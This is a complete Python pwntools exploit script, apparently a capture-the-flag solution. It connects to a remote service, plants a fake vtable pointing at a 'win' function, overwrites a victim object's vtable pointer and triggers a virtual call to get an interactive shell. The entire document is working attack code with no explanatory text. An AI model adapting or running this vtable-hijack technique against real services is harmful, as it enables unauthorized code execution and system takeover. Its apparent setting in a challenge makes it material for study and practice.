#!/usr/bin/env python
import pwn
import sys
import struct

win_func = 0x08048f70

c = pwn.remote(sys.argv[1], 1337)

# post fake vtable
c.send("POST\n")
c.send("ZSTR\n")
c.send(b"AAAABBBB" + struct.pack("<I", win_func) + b"\n")
c.recvline()
ptr = c.recvline()
print "Fake vtable @ " + hex(int(ptr))

# create victim object
c.send("POST\n")
c.send("PSTR\n")
c.send("AAAA\n")
c.recvline()
victim = c.recvline()
print "Victim object @ " + hex(int(victim)) + b"\n"

# swap out the victim object's vtable
c.send("PUT\n")
c.send(victim)
c.send(struct.pack("<I", int(ptr)) + "\n")
c.recvline()
thing = c.recvline()
print "Swapped out vtable"

# trigger the win function
print "Shell incoming..."
c.send("GET\n")
c.send(thing)

# use your shiny new shell
c.interactive()
